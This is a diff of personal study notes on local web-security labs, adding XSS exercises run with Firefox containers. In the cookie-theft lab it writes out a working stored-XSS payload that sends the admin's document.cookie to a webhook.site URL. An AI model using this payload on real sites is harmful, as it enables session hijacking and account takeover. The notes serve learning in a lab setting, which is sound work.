@@ -1705,10 +1705,11 @@ fi
 
 - Run docker compose:
   `sudo docker-compose up`
-  if you got an error `Error starting userland proxy: listen tcp4 0.0.0.0:80: bind`
+  >[!warning] Error
+  >if you got an error `Error starting userland proxy: listen tcp4 0.0.0.0:80: bind`
   =>
   try to stop apache and then run again docker -compose:
-	  sudo /etc/init.d/apache2 stop
+  `sudo /etc/init.d/apache2 stop`
 
 - go ahead when you see -->  the databses are 'ready for connections'
   ![[Pasted image 20240307104124.png]]
@@ -2117,3 +2118,71 @@ setup a container for testing -->  this allow us to:
 							- test across different users
 in this way:
 we can check if the -->  XSS is stored
+=>
+follow these [[cheet#Firefox Multi-Account Containers|steps]]
+
+Now:
+- copy the lab URL
+- Open Multi-account plugin > click on Container 1 => it will open a new page as "container 1"
+- paste the URL in this new page =>  we can access the LAB as user1
+- to the same for -->  Container 2
+
+when you are testing for XSS:
+you can first check for -->  <span style="color:#00b050">HTML injection</span>
+=>
+- `<h1> test </h1>`
+  ![[Pasted image 20240308105757.png]]
+=>
+it works
+
+=>
+let's try with:
+- `<script> prompt(1) </script>`
+  it works
+  =>
+	- <span style="background:#fff88f">try to refresh the page for Container 2 session</span>
+	  =>
+	  you'll see that -->  <span style="color:#00b050">the prompt will open even for the second user</span> 
+	  =>
+	  every user that will come to this page -->  it will affected by this injection
+
+##### XSS 0x03
+- set up [[cheet#Firefox Multi-Account Containers|firefox multicontainer plugin]]
+- open 2 page as the 2 containers
+	- into container 2 connect to -->  http://localhost/labs/x0x03_admin.php
+goal:
+- still the admin cookie
+- don't popup in alert box -->  but EXFILTRATE IT
+  =>
+	- from container 1 -->  we will create the payload
+	- from container 2 -->  we will trigger the payload  
+
+=>
+if you send some data from the input -->  you'll see it inside the admin page
+=>
+let's try with HTML injection:
+ `<h1> test </h1>`
+ -->  <span style="color:#00b050">both input are vulnerable</span> 
+
+###### Popup Cookies
+let's first popup the cookie:
+`<script> alert(document.cookie)</script>`
+=>
+if you refresh the container 2 -->  <span style="color:#00b050">you'll see a popup with the admin cookie</span> 
+=>
+###### Exfiltrate Cookies
+- open [[cheet#Webhook.site|WebHook website]]
+- copy the unique URL
+- at the end of it -->  `/?`
+- type in the vulnerable input
+  `<script> var i = new Image; i.src="https://webhook.site/a67abe7f-f8f9-44af-bf90-6f29be6fd833/?"+document.cookie; </script>`
+- refresh the admin page
+- <span style="color:#00b050">we got the cookie</span> 
+  ![[Pasted image 20240308113410.png]]
+
+
+### Command Injection
+<span style="background:#fff88f">serious vuln:</span>
+bc if you find it => you can:
+                  - <span style="color:#00b050">compromise the entire app</span>
+                  - <span style="color:#00b050">compromise the host</span> 
